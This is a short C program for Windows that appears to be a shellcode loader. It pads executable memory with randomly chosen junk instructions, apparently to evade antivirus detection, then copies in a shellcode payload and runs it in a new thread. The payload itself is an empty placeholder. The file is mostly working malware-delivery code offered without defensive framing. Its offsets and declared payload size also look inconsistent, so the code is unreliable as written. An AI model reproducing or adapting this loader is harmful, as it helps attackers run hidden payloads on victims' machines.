#include <windows.h>
#include <time.h>

#define SHELLCODE_SIZE 311
#define JUNKCODE_MAX 10000
#define MIN 0
#define MAX 5
#define COLUMN_NUMBERS 3

int getRandomRowNumberIntruction();

int main(int argc, char* argv[])
{
    unsigned char junkcode[] = {
        0x48, 0x29, 0xC0,
        0x48, 0xFF, 0xC2,
        0x48, 0xFF, 0xCA,
        0x48, 0x29, 0xC2,
        0x48, 0xFF, 0xC0,
        0x48, 0x31, 0xD2
    };

    int reservedSize = SHELLCODE_SIZE + JUNKCODE_MAX * 3;
    char *virtualPointer = VirtualAlloc(
        0, 
        reservedSize,
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );

    srand(time(NULL));
    for (int i = 0; i < JUNKCODE_MAX; i++) {
        int rowNumberIntruction = getRandomRowNumberIntruction();
        int limit = rowNumberIntruction + COLUMN_NUMBERS;
        int j = 0;
        unsigned char tempJunkcode[COLUMN_NUMBERS];
        for (int k = rowNumberIntruction; k < limit; k++) {
            tempJunkcode[j] = junkcode[k];
            j++;
        }

        CopyMemory(
            virtualPointer + (COLUMN_NUMBERS * i),
            tempJunkcode,
            COLUMN_NUMBERS
        );
    }

    unsigned char shellcode[] = {
        //SHELLCODE
    };

    CopyMemory(
        virtualPointer + JUNKCODE_MAX,
        shellcode,
        SHELLCODE_SIZE
    );

    HANDLE hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)virtualPointer,
        NULL,    
        0,       
        0
    );

    WaitForSingleObject(hThread, INFINITE);
    return 0;
}


int getRandomRowNumberIntruction() {
    return (MIN + rand() % (MAX + 1 - MIN)) * COLUMN_NUMBERS;
}